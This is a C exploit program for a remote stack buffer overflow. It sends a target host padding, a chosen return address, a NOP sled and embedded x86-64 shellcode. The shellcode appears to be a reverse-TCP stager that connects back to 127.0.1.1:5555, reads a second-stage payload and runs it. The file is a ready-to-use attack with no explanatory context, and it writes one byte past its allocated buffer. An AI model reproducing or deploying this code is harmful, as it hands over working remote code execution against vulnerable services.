#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>

typedef struct BUFFER_S {
    char* buff;
    int size;
} Buffer;

Buffer* generateShellCode(char *addrstr);

int main(int argc, char *argv[]) {
  int sock, numbytes;
  struct sockaddr_in server;
  struct hostent *hp;

  char buf[BUFSIZ + 1];
  char* host;

  if(argc != 4) {
    printf("Usage: %s <host> <port> <jump>\n", argv[0]);
    exit(1);
  }
  Buffer* dados = generateShellCode(argv[3]);

  host = argv[1];

  if((hp = gethostbyname(host)) == NULL){
    printf("Couldn't resolve host.\n");
    exit(1);
  }

  bcopy((char *) hp->h_addr_list[0], (char*)&server.sin_addr, hp->h_length);
  server.sin_family = hp->h_addrtype;

  server.sin_port = htons(atoi(argv[2]));

  if((sock = socket(hp->h_addrtype, SOCK_STREAM, 0)) < 0){
    printf("Couldn't create socket.\n");
    exit(1);
  }

  if(connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0){
    printf("Couldn't connect socket.\n");
    exit(1);
  }
  
  if(write(sock, dados->buff, dados->size) != dados->size){
    printf("Couldn't write to socket.\n");
    exit(1);
  }

  read(sock, buf, BUFSIZ);
  printf("Received: %s\n", buf);

  close(sock);

  exit(0);

}

#define NOP 0x90

unsigned char shellcode[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x15\xb3\x7f\x00\x01\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

Buffer* generateShellCode(char *addrstr) {
    int nop_padding = 100;
    int code_size = 130;   
    int padding = 40;
    int eip_size = 8;  

    int total_size = padding + eip_size + nop_padding + code_size;
    fprintf(stderr, "Total size: %d\n", total_size);
    unsigned char* code = shellcode;
    
    Buffer* buffer = malloc(sizeof(Buffer));
    buffer->buff = malloc(total_size * sizeof(unsigned char));
    buffer->size = total_size;

    // add padding to go over rbp
    for(int i = 0; i < padding; i++)
        buffer->buff[i] = 'A';

    unsigned long long addr = strtoull(addrstr, NULL, 16);

    // add address to jump to
    for(int i = 0; i < eip_size; i++)
    {
        buffer->buff[padding + i] = addr & 0xff;
        addr = addr >> 8;
    }

    // add nop sled
    for(int i = 0; i < nop_padding; i++)
        buffer->buff[padding + eip_size + i] = NOP;

    // add shellcode
    int i;
    for(i = 0; i < code_size; i++)
        buffer->buff[padding + eip_size + nop_padding + i] = code[i];
    
    buffer->buff[total_size] = '\0';

    return buffer;
}